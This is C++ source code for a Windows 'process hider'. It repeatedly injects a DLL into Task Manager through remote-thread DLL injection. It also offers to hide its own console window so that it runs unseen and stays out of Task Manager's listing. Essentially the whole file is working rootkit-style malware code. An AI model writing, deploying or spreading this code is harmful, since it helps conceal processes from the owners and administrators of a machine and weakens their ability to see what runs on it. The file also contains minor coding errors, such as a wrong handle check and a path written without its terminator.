#include <Windows.h>
#include <iostream>
#include <TlHelp32.h>
#include <string>

using namespace std;

bool inject_dll(DWORD pid, string dll_path) {

	HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (handle == INVALID_HANDLE_VALUE) {
		cout << " [-] Open Process Failed" << endl;
		return false;
	}
	else { cout << " [+] Got a Handle to the Remote Process" << endl; }

	LPVOID address = VirtualAllocEx(handle, NULL, dll_path.length() , MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);
	if (address == NULL) {
		cout << " [-] VirtualAllocEx Failed" << endl;
		return false;
	}
	else {	cout << " [+] Successfully Allocated Memory in Remote Process" << endl; }


	bool res = WriteProcessMemory(handle, address, dll_path.c_str(), dll_path.length(), 0);
	if (res) {
		cout << " [+] DLL Path written to Remote Process" << endl;
	}
	else {	cout << " [-] WriteProcessMemory Failed" << endl; }

	if (CreateRemoteThread(handle, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibraryA, (LPVOID)address, NULL, NULL) ==  INVALID_HANDLE_VALUE) {
		cout << " [-] CreateRemoteThread Failed" << endl;
	}
	else { cout << " [+] DLL Loaded Into Remote Process" << endl; }

	cout << " [+] Process Hidden" << endl << endl;
	CloseHandle(handle);
	return true;
}

void find_and_inject()
{
	char* dll_path_c = (char*)malloc(sizeof(char) * 3000);
	GetModuleFileNameA(NULL, dll_path_c, 3000);

	DWORD lastpid = 4;
	string dll_path(dll_path_c);
	size_t index = dll_path.find_last_of('\\');
	dll_path.erase(dll_path.begin() + index, dll_path.end());
	dll_path.append("\\ProcessHider.dll");

	while (true) {		// Keep running to check if TM closes and reopens, if yes then inject again
		PROCESSENTRY32 process;
		process.dwSize = sizeof(PROCESSENTRY32);

		HANDLE proc_snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (proc_snap == INVALID_HANDLE_VALUE) {
			cout << " [-] CreateToolhelp32Snapshot Failed" << endl;
			return;
		}

		if (!Process32First(proc_snap, &process)) {
			cout << " [-] Process32First Failed" << endl;
			return;
		}

		do
		{
			if (!lstrcmp(process.szExeFile, L"Taskmgr.exe") && lastpid != process.th32ProcessID) {
				cout << " [+] Task Manager Found" << endl;
				if (!inject_dll(process.th32ProcessID, dll_path)) {
					cout << " [-] Unable to Inject DLL!! Check if you are running as Admin" << endl << endl;
					break;
				}
				lastpid = process.th32ProcessID;
			}
		} while (Process32Next(proc_snap, &process));
		CloseHandle(proc_snap);
		Sleep(1000);
	}
}

void map_process_name(string process) {
	// TODO: Map process to hide using File Mapping so it can be accessed by DLL
	// For Now the application works and hides the hardcoded notepad.exe
}

int main()
{
	string process;
	char choice;
	// cout << " Enter Process Name To Hide" << endl << "--> ";
    // cin >> process;
	cout << " Hide this Console? (y/n)" << endl << "-->";
	// This Will Hide the Console Window, The Program Will Still Run in Background and will be hidden from TaskManager too !! 
	cin >> choice;
	if (tolower(choice) == 'y') {
		ShowWindow(GetConsoleWindow(), SW_HIDE);
	}
	map_process_name(process);
	find_and_inject();
	return 0;
}